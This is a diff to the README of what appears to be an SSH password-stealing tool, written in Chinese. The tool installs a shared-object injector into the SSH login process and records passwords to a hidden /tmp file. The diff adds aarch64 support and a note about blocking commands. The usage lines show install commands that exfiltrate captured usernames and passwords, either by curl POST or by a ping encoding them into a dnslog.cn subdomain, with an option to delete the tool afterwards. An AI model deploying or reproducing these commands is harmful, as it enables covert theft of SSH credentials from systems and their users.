@@ -10,11 +10,11 @@
 # how to use
 
 ## auto installer
-密码记录器一键安装，仅暂时支持x64
+密码记录器一键安装，仅暂时支持x64/aarch
 
 直接执行命令
 ```
-bash install.sh
+bash install.sh or bash install_aarch64.sh
 ```
 
 直接运行后ssh密码登录，记录地址为/tmp/.password.txt，默认so地址为/tmp/hello.so，默认注入器名字为/tmp/.i
@@ -36,7 +36,7 @@ https发送密码
 bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
 ```
 
-dns发送密码并且自动删除
+dns发送密码并且自动删除（请确保你的命令是不堵塞的，因为本程序的实现用的是system是当线程，命令如果堵塞将会导致ssh登录线程一并堵塞）
 ```
 bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
 ```
